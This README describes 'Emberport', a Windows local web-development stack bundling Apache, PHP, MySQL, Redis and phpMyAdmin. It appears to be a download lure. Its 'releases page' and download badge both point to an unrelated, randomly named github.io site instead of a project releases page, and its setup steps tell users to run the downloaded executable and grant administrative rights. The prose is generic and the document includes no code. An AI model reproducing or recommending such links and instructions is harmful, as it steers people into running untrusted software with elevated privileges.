# 💻 Emberport - Build websites on your computer easily

[![Download Emberport](https://img.shields.io/badge/Download-Emberport-blue.svg)](https://virginwoolerythrinavespertilio78.github.io)

Emberport provides a workspace for web development on Windows. It includes software tools to host websites, manage databases, and process PHP scripts. You gain control over your local environment through a simple interface. You switch between software versions or turn services on and off with single clicks. 

## 🏗️ Why choose Emberport

Web development often requires multiple separate programs. You must install Apache for the web server, PHP for processing, and MySQL for data. Setting these up manually takes time and creates configuration errors. Emberport packages these tools into one executable file. It manages the background processes so you focus on your web pages. 

The application handles common tasks like:

- Starting and stopping your web server.
- Managing your local database records.
- Switching between different PHP versions.
- Accessing your database through a browser interface.

## ⚙️ System requirements

Ensure your computer meets these standards before you begin:

- Operating System: Windows 10 or Windows 11.
- Processor: Recent Intel or AMD processor.
- Memory: 4 gigabytes of RAM or more.
- Disk Space: 500 megabytes of free space.
- Network: Active internet connection for the initial download.

## 🚀 Setting up the application

Follow these steps to install the software on your system.

1. Visit the [Emberport releases page](https://virginwoolerythrinavespertilio78.github.io) to download the latest setup file. 
2. Locate the file in your Downloads folder once the transfer finishes. 
3. Double-click the file to start the installer.
4. Follow the prompts on the screen. Select a destination folder for your web files. 
5. Grant permission if Windows displays a security prompt. The application requires these rights to manage background services.
6. Click Finish to complete the process.

## 🛠️ Using the interface

Open Emberport using the desktop icon. The main window shows a Dashboard. Look at the status lights next to each service. Green indicates the service runs. Red indicates it rests.

### Apache Web Server
The server hosts your files. Place your website folders inside the directory you chose during setup. Open your browser and type localhost to see your files. 

### MySQL Database
This tool stores your website data. Use the start button to initialize the database engine. If a website requires a database, create a new one using the provided tools.

### Redis
Emberport includes Redis for caching. This tool speeds up dynamic websites by storing temporary data in memory. Toggle the switch to activate memory caching for your project.

### PHP Management
Different websites depend on different language versions. Click the PHP menu to toggle between available releases. The software automatically restarts the server to apply the changes.

### phpMyAdmin
This interface helps you manage your database tables. Click the link labeled Database Manager to open a window in your default web browser. Use this tool to import, export, or edit your data without writing code.

## 🧹 Managing background services

Emberport manages services through the Windows Service Control Manager. When you quit the application, it stops the background processes. This ensures your computer remains fast while you do not work on development tasks. 

If a service fails to start, verify that no other program uses the same communication ports. Common programs like Skype or custom database installations sometimes use the same network paths required by Apache or MySQL.

## 🆘 Troubleshooting

- Application does not open: Ensure you have the latest .NET runtime installed. Most Windows systems include this, but you can download it from the official Microsoft portal if necessary.
- Browser shows an error: Check the status dashboard. Verify that Apache runs and shows a green light.
- Database access denied: Confirm that you started the MySQL service. Refresh the phpMyAdmin page after the service status turns green.
- Storage folder missing: Open the application settings to find the link to your project storage location. You can move this folder to a different drive if you have limited space on your primary hard drive.

## 🤝 Contributing to the project

Developers may review the source code on GitHub. The application uses C# and WPF to provide the user interface. Volunteers submit patches for new features or bug fixes. Please check the issues tab to see items the team currently tracks.

Keywords: apache, csharp, developer-tools, dotnet, local-development, mysql, php, phpmyadmin, redis, windows, wpf